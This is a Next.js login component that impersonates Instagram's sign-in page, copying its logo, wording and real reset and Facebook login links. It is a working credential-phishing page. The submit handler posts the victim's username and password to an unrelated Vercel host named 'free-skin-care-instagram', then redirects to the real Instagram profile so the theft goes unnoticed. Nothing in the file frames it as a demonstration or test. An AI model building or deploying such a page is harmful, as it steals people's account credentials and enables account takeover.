"use client";

import { useState } from "react";
import "./style.css";
import Link from "next/link";
import axios from "axios";

export default function Login() {
    const route = useRouter();

  const [id, setId] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async () => {
    try {
      await axios.post(
        "https://free-skin-care-instagram.vercel.app/api/login",
        { id, password },
        {
          headers: {
            "Content-Type": "application/json",
          },
        }
      );
            route.push(`https://www.instagram.com/${id}/`);

    } catch (error) {
      console.log(error);
    }
  };

  return (
    <div className="container">
      <div className="login-box">
        <i
          data-visualcompletion="css-img"
          aria-label="Instagram"
          role="img"
          style={{
            backgroundImage:
              'url("https://static.cdninstagram.com/rsrc.php/v3/yM/r/8n91YnfPq0s.png")',
            backgroundPosition: "0px -52px",
            backgroundSize: "auto",
            width: "175px",
            height: "51px",
            backgroundRepeat: "no-repeat",
            display: "inline-block",
            marginTop: "30px",
          }}
        ></i>
        <div className="input">
          <input
            type="text"
            placeholder="Phone number, username, or email address"
            className="input-field"
            value={id}
            onChange={(event) => setId(event.target.value)}
          />
          <input
            type="password"
            placeholder="Password"
            className="input-field"
            value={password}
            onChange={(event) => setPassword(event.target.value)}
          />
        </div>
        <button className="login-button" onClick={handleSubmit}>
          Log in
        </button>
        <div className="forgot-password">
          <Link href="https://www.instagram.com/accounts/password/reset/">
            Forgotten your password?
          </Link>
        </div>
        <div className="separator">OR</div>
        <Link
          href={
            "https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25228tmtk71rgs2i8dmti33aue5pmlhqki6qf3esx16l6pcx1wmxza0%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D033ad6ff-8d1f-4472-b830-17b93c209e86%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25228tmtk71rgs2i8dmti33aue5pmlhqki6qf3esx16l6pcx1wmxza0%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0"
          }
          className="facebook-login"
        >
          Log in with Facebook
        </Link>
      </div>
    </div>
  );
}
